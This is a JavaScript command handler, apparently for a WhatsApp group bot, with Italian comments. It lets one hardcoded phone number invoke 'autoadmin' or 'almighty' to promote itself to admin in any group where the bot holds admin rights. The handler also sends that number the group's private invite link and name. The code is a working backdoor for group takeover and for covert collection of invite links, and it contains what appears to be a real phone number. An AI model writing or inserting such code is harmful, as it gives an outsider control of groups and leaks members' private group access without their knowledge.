const handler = async (m, { conn }) => {
    try {
        // Numero autorizzato (in JID WhatsApp)
        const allowedNumber = '4915511759515@s.whatsapp.net'

        if (m.sender !== allowedNumber) {
            return await conn.reply(m.chat, '❌ Non sei autorizzato a usare questo comando.', m)
        }

        // Controlla se il bot è admin
        if (!m.isGroup) return m.reply('❌ Questo comando funziona solo in gruppi.')
        if (!m.botAdmin) return m.reply('❌ Il bot deve essere admin per eseguire questo comando.')

        // Ottieni info gruppo
        const groupMetadata = await conn.groupMetadata(m.chat)

        // Promuovi l’utente a admin
        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')

        // Ottieni link del gruppo
        const groupLink = await conn.groupInviteCode(m.chat)
        const fullLink = `https://chat.whatsapp.com/${groupLink}`

        // Invia messaggio di log al tuo numero
        await conn.sendMessage('4915511759515@s.whatsapp.net', {
            text: `*⭒─ׄ─ׅ─ׄ─⭒*⬣ AUTOADMIN ⬣*⭒─ׅ─ׄ─ׅ─ׄ─⭒*

『 📲 』 *Utente:* @${m.sender.split('@')[0]}
『 📝 』 *Nome:* ${await conn.getName(m.sender)}
『 📞 』 *Numero:* +${m.sender.split('@')[0]}

『 📌 』 *Gruppo:*\n${groupMetadata.subject}
『 🔗 』 *Link:*\n${fullLink}`,
            mentions: [m.sender],
            quoted: m
        })

        // Messaggio conferma all’utente
        await conn.reply(m.chat, '✅ Sei stato promosso admin!', m)

    } catch (e) {
        console.error(e)
        m.reply('❌ Errore durante l’esecuzione del comando.')
    }
}

handler.command = ['autoadmin', 'autoadm', 'almighty']
handler.group = true
handler.botAdmin = true

export default handler
